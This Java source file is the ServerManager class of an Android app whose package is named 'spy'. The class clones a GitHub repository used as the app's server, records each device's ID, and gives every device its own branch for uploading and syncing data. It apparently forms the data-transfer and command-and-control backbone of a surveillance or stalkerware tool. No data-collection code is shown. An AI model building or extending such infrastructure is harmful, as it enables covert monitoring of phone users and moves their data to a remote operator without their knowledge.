package com.gameofcoding.spy.server;

import android.content.Context;
import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.eclipse.jgit.api.errors.GitAPIException;
import org.eclipse.jgit.api.errors.InvalidRemoteException;
import org.eclipse.jgit.api.errors.TransportException;
import org.json.JSONArray;
import org.json.JSONException;

/**
 * ServerManager manages all the starting stuff that we need for getting started with upload and
 * download of data.
*/
public class ServerManager {
    private static final String TAG = "ServerManager";
    /*package*/ static final String BRANCH_MASTER = RepoManager.BRANCH_MASTER;
    /*package*/ static final String BRANCH_APP_DATA = "app_data";
    /*
     * Name of the file that contains the list of devices that has been added to server.
     */
    private final String ADDED_DEVICES_FILE = "addedDevices.json";
    /*
     * Stores the number of retries for downloading repo.
    */
    private int mRetries;
    /*
     * Path to the root directory of repository.
     */
    private File mRepoRootDir;
    /*
     * Name of the branch of current device.
     */
    private String mDeviceBranch;
    //private Context mContext;
    private RepoManager mGitRepo = new RepoManager();

    public ServerManager(Context context, File repoRootDir) {
	//mContext = context;
	mRepoRootDir = repoRootDir;
	mDeviceBranch = new Utils(context).generateDeviceId();
    }

    public Server loadServer() {
	return loadServer(false);
    }

    /**
     * Returns path of the root directory of repository
     */
    public File getRepoRootDir() {
	return mRepoRootDir;
    }

    /**
     * Loads the git repo. If it was'nt cloned previously it calls downloadGitRepo() in order to
     * clone it otherwise it just pulls the branches (if specified) and initialzes the RepoManager.
     */
    public Server loadServer(boolean reloadData) {
	if(mRetries > 5) {
	    XLog.w(TAG, "Unable to load server, exceeded number of retries");
	    return null;
	} else  mRetries++;

	try {
	    boolean hasClonedRepo = false;
	    if(!mRepoRootDir.exists()) {
		// We have not cloned repositoru yet, clone it.
		if(!downloadGitRepo()) {
		    XLog.i(TAG,"Failed to download repo, retrying to load server...");
		    return loadServer();
		}
		hasClonedRepo = true;
	    }
	    mGitRepo.loadRepo(mRepoRootDir);

	    // Validate repo
	    if(!(mGitRepo.hasLocalBranch(BRANCH_MASTER)
                 && mGitRepo.hasLocalBranch(mDeviceBranch))) {
		XLog.w(TAG, "Invalide repository. Does not contain all branches.");
		if(FileUtils.delete(mRepoRootDir))
		    XLog.i(TAG , "loadServer(): Repo directory deleted");
		else
		    XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
		XLog.i(TAG, "Retrying to load server...");
		return loadServer();
	    } else XLog.i(TAG, "Valid repository.");

	    // Pull data from repo.
	    Server server = new Server(mGitRepo, mDeviceBranch);
	    if(!(hasClonedRepo) && reloadData) {
		XLog.i(TAG, "loadServer(): Syncing all directories with server.");
		server.reloadData();
		XLog.i(TAG, "loadServer(): All directories successfully synced.");
	    }
	    return new Server(mGitRepo, mDeviceBranch);
	} catch(Exception e) {
	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
	    if(FileUtils.delete(mRepoRootDir))
		XLog.i(TAG , "loadServer(): Repo directory deleted");
	    else
		XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
	    XLog.i(TAG, "Retrying to load server...");
	    return loadServer();
	}
    }

    private boolean deviceExists() {
	File file = new File(mRepoRootDir, ADDED_DEVICES_FILE);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exisr, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		return false;
	    JSONArray devices = new JSONArray(jsonFileData);
	    for(int i = 0; i < devices.length(); i++) {
		String device = devices.getString(i);
		if(device.equals(mDeviceBranch)) {
		    // Device exists
		    return true;
		}
	    }
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for checking device ids, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;
    }

    private boolean addDevice() {
	File file = new File(mRepoRootDir, ADDED_DEVICES_FILE);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exist, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		jsonFileData = "[]";
	    JSONArray devices = new JSONArray(jsonFileData);
	    devices.put(mDeviceBranch);
	    XLog.d(TAG, "devices: " + devices.toString() + ", file: " + file.toString());
	    FileWriter fw = new FileWriter(file);
	    BufferedWriter bw = new BufferedWriter(fw);
	    bw.write(devices.toString());
	    bw.close();
	    fw.close();
	    return true;
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for storing device id, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;
    }

    /**
     * Downloads the github repository, which acts as a server for this app.
     * <b>NOTE: It does not clones all the branches, it just clones master, app_data and devices
     * branch (if previously exists).</b>
     */
    private boolean downloadGitRepo() throws InvalidRemoteException, TransportException,
					     GitAPIException, IOException {
	if(mRepoRootDir.exists()) {
	    if(!FileUtils.delete(mRepoRootDir))
		return false;
	}

	// Remote branches to clone
	List<String> branchesToClone = new ArrayList<String>();
	branchesToClone.add(BRANCH_MASTER);

	// Clone repo with above branch and device branch (if exists)
	if(mGitRepo.clone(mRepoRootDir, branchesToClone)) {
	    if(deviceExists()) {
		// Device previously exists, fetch its branch
		XLog.i(TAG, "downloadGitRepo(): Device already exists, deleting its remote branch...");
		if(mGitRepo.deleteRemoteBranch(mDeviceBranch)) {
		    XLog.i(TAG, "downloadGitRepo(): Device's remote branch deleted successfully");
        	} else {
		    XLog.e(TAG, "downloadGitRepo(), Could'nt delete device's remote branch");
		    return false;
		}
	    } else {
		XLog.i(TAG, "Device not added previously, adding device...");

		// Do entry of device
		XLog.i(TAG, "Adding device...");
		mGitRepo.checkout(BRANCH_MASTER);
		addDevice();
		mGitRepo.commit("added device, " + mDeviceBranch);
		mGitRepo.push();
		XLog.i(TAG, "Device entry done.");
	    }

	    // Create empty local branch an remote branch for device
	    XLog.i(TAG, "Pushing new branch for device");
	    mGitRepo.checkoutOrphanBranch(mDeviceBranch);
	    mGitRepo.push(mDeviceBranch, mDeviceBranch);
	    mGitRepo.setRemoteTrackingBranch(mDeviceBranch, mDeviceBranch);

	    XLog.i(TAG, "Device '" + mDeviceBranch + "' added to server.");
	    return true;
	}
	return false;
    }
}
